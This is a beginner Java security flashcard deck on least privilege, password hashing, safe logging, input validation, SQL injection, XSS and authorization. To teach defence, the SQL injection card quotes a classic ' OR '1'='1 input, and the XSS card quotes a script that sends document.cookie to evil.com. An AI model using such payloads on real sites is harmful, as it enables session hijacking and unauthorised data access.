# Java Security Awareness
# Tier: Beginner
# Format: Front[TAB]Back

[Beginner] What is the principle of least privilege?	Grant each component, user, or process only the minimum permissions it needs to perform its function — nothing more. Applied to Java: don't expose public APIs for things that should be internal; use `private`/package-private; don't run services as root; limit database user permissions to only the tables and operations needed. This limits the blast radius if that component is compromised or buggy.
[Beginner] Why should you never store plaintext passwords?	If an attacker gains access to your database (SQL injection, backup theft, insider threat), plaintext passwords expose every user's credentials immediately — and users reuse passwords across sites. Instead, store a slow cryptographic hash using bcrypt, Argon2, or PBKDF2. These algorithms are intentionally slow (work-factor tunable) and use per-user random salts, making brute-force and rainbow-table attacks impractical.
[Beginner] What data should never be logged?	Passwords (even hashed). Authentication tokens, session IDs, API keys. Credit card numbers, CVVs, bank account numbers. Personally Identifiable Information (PII): national IDs, full birth dates, medical records. Private keys or certificates. Log the event (e.g., "login attempt") but strip or mask sensitive parameters before writing to logs. Log aggregators and log files are often less secure than primary datastores.
[Beginner] What is input validation and why is it important?	Input validation is the process of verifying that all data entering a system conforms to expected type, length, format, and range before processing it. Without it, attackers exploit unexpected input to trigger SQL injection, command injection, path traversal, or application crashes. In Java: use allow-lists (define what's valid) rather than deny-lists (blocking known bad input). Validate on the server side — never trust client-side-only validation.
[Beginner] What is SQL injection and why is string concatenation in queries dangerous?	SQL injection occurs when user-supplied input is concatenated directly into a SQL string, letting attackers alter the query structure. Example: `"SELECT * FROM users WHERE name = '" + username + "'"` — if `username` is `' OR '1'='1`, the query returns all users. In Java, always use `PreparedStatement` with parameterized queries: `stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?"); stmt.setString(1, username);`. The driver safely escapes parameters, making injection impossible.
[Beginner] What is XSS (Cross-Site Scripting) at a conceptual level?	XSS is an attack where an attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. Example: a comment box that stores `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` — anyone viewing that comment has their session cookie stolen. Prevention: escape all user-supplied content before rendering it as HTML (encode `<` as `&lt;`, etc.). Never trust data coming from the browser.
[Beginner] Why should you validate data on the server side even if you validate on the client side?	Client-side validation (JavaScript, HTML5 form constraints) can be trivially bypassed — an attacker can use curl, Postman, or browser dev tools to submit any data directly to the server endpoint. Client-side validation is a UX convenience only. Server-side validation is the actual security control. Always treat incoming data as potentially hostile regardless of where it came from.
[Beginner] What is the difference between authentication and authorization?	Authentication (AuthN) is verifying WHO you are — confirming identity via password, token, certificate, biometric, etc. Authorization (AuthZ) is verifying WHAT you are allowed to do — checking permissions after identity is established. Common mistake: checking only authentication (is the user logged in?) but not authorization (does THIS user have permission for THIS resource?), leading to IDOR (Insecure Direct Object Reference) vulnerabilities.
